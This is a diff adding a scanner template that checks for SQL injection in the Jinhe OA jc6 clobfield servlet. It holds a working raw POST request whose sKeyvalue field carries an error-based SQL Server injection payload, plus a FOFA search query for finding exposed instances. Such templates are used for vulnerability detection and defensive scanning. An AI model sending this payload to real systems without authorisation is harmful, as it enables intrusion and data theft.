@@ -1,0 +1,41 @@
+id: jinhe-jc6-sqli
+
+info:
+  name: Jinhe OA - SQL Injection
+  author: Ky9oss
+  severity: high
+  description: |
+    SQL injection vulnerability in the ljc6/servlet/clobfield interface of Jinhe OA jc6. An attacker can obtain sensitive information.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA%20jc6%20clobfield%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://blog.csdn.net/qq_41904294/article/details/135074649
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="金和协同管理平台"
+  tags: jinher,jc6,sqli
+variables:
+  num: "{{rand_int(9000000, 9999999)}}"
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/clobfield HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11' and CONVERT(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{num}}%27))))=1 and ''='
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(num)}}"
+          - "nvarchar"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 490a004630440220148cde3bd6d5479603a89ce50d2d98d3077e884e843ce6444bdfb552af0695a6022023b0353a9ef0df082f45df1f4520343b154bf544ef78f260029f971362da0887:922c64590222798bb761d5b6d8e72950
